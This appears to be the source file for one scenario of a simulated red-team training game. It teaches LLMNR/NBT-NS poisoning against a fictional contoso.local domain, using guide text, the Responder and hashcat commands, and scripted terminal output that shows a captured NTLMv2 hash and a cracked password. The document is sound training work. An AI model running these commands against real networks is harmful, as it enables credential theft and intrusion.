/**
 * Mission 1C: LLMNR/NBT-NS Poisoning
 *
 * This scenario simulates capturing a user's hash by
 * poisoning local name resolution protocols.
 */

export const llmnrScenario = {
  id: 'llmnr-poisoning',
  title: 'LLMNR/NBT-NS Poisoning',
  description: 'Capture user password hashes by impersonating network services using Responder.',
  difficulty: 'Intermediate',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**LLMNR/NBT-NS Poisoning** is a man-in-the-middle attack that abuses legacy Windows name resolution.

**Attack Flow:**
1.  Run 'Responder' to listen for LLMNR/NBT-NS broadcasts.
2.  Wait for a user to make a typo (e.g., \`\\FILESVRO\`).
3.  Responder lies and tells the user's PC that it is 'FILESVRO'.
4.  The user's PC sends its NTLMv2 hash to the attacker.
5.  Capture the hash and crack it offline.

**Why This Matters:**
This is one of the most common ways to get an initial foothold. It requires zero credentials and only relies on being on the same network.`,
    steps: [
      {
        number: 1,
        title: 'Run Responder',
        description:
          'Start Responder. It will begin listening on the network for LLMNR and NBT-NS broadcast queries.',
        command: 'responder -I eth0 -v',
        tip:
          '-I specifies the interface. -v (verbose) shows more detailed output.'
      },
      {
        number: 2,
        title: 'Capture Hash',
        description:
          'A user on the network has mistyped a server name. Responder has poisoned the request and captured their hash!',
        command: null, // This step will auto-run
        tip: 'The NTLMv2 hash is now saved to your "Files" tab.'
      },
      {
        number: 3,
        title: 'Crack the Hash',
        description:
          'Use "hashcat" to crack the NTLMv2 hash (mode 5600) against a wordlist.',
        command:
          'hashcat -m 5600 captured_hash.txt wordlist.txt',
        tip: 'NTLMv2 hashes are strong, but often crackable if the password is weak.'
      },
      {
        number: 4,
        title: 'Credentials Obtained',
        description:
          'Success! You now have a valid user password.',
        command: null,
        tip:
          'You can now use "b.user:Summer2025!" to continue your attack.'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      expectedCommand: 'responder -I eth0 -v',
      attackerOutput: [
        '[*] Responder is now listening for LLMNR/NBT-NS requests...',
        '[*] Poisoners: [HTTP] [SMB] [DNS] [LDAP] [MDNS]',
        '[*] Waiting for events...'
      ],
      serverOutput: [
        '[NET] 10.0.0.5 has enabled promiscuous mode.',
        '[AUDIT] LLMNR/NBT-NS listener detected on the network.'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: null, // Auto-advances after a delay
      attackerOutput: [
        '[+] LLMNR Poisoned answer sent to 10.0.1.50 for "FILESVRO"',
        '[+] NBT-NS Poisoned answer sent to 10.0.1.50 for "FILESVRO"',
        '[SMB] NTLMv2-SSP hash captured for CONTOSO\\b.user:',
        '[SMB] b.user::CONTOSO:1122334455667788:AABBCCDDEEFFGGHH...',
        '[+] Hash saved to: captured_hash.txt'
      ],
      serverOutput: [
        '[NET] 10.0.1.50 -> 224.0.0.252 (LLMNR Query "FILESVRO")',
        '[NET] 10.0.0.5 -> 10.0.1.50 (LLMNR Response "FILESVRO is at 10.0.0.5")',
        '[SMB] 10.0.1.50 -> 10.0.0.5 (SMB Auth Request for b.user)',
        '[ALERT] A client (10.0.1.50) has authenticated with an untrusted host (10.0.0.5)!'
      ],
      delay: 1500 // Simulates waiting for a user
    },
    {
      id: 3,
      expectedCommand: 'hashcat -m 5600 captured_hash.txt wordlist.txt',
      attackerOutput: [
        '[*] Starting Hashcat (NTLMv2, mode 5600)...',
        '[*] Dictionary: wordlist.txt (1,000,000 entries)',
        '[*] Cracking in progress...',
        '[*] 20% complete...',
        '[*] 40% complete...',
        '[*] 60% complete...',
        '[+] Hash cracked!',
        '[+] b.user::CONTOSO...:Summer2025!',
        '[+] Cracking complete. 1 hash recovered.'
      ],
      serverOutput: [
        '[SYSTEM] No network activity (offline cracking).'
      ],
      delay: 200
    },
    {
      id: 4,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] LLMNR Poisoning Complete',
        '[+] ============================================',
        '[+] Credentials Found: 1',
        '[+] User: b.user',
        '[+] Pass: Summer2025!',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use these new credentials to see what you can access.',
        '[*] 2. Run BloodHound with these credentials.',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '[INFO] Attacker 10.0.0.5 now has a valid user password.',
      ],
      delay: 400
    }
  ]
};

export default llmnrScenario;